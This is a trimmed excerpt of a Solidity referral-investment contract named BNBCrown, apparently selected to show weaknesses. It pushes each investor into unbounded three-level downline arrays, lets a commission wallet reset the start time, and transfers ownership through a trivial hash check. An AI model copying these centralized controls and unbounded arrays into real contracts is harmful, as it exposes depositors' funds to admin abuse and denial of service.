...
contract BNBCrown {
    ...
    struct User {
        ...
        address referrer;
        uint256[3] levels;
        mapping(uint256 => address[]) downlineAddress;
        uint256 bonus;
        uint256 totalBonus;
    }
    ...
    function invest(address referrer, uint8 plan) public payable {
        ...
        if (user.referrer == address(0)) {
            ...
            for (uint256 i = 0; i < 3; i++) {
                if (hlevel != address(0)) {
                    users[hlevel].levels[i]++;
                    users[hlevel].downlineAddress[i].push(msg.sender);
    ...
    function updateStartTime(uint256 newTime) external returns (bool) {
        require(msg.sender == commissionWallet, 'invalid call');
        startUNIX = newTime;
        return true;
    }

    function setTempOwner(address _tempOwner) external onlyOwner {
        tempOwner = _tempOwner;
    }

    function getHash() external view returns (bytes32) {
        return keccak256(abi.encodePacked(tempOwner));
    }

    function transferOwnership(bytes32 hash) external onlyOwner {
        require(hash == keccak256(abi.encodePacked(tempOwner)), "transferOwnership error");
        owner = tempOwner;
    }
    ...
    function getUserDownlineData(address userAddress, uint256 level) public view returns (DownlineRecord[] memory downlineRecord){
        address[] storage allDownline = users[userAddress].downlineAddress[level];
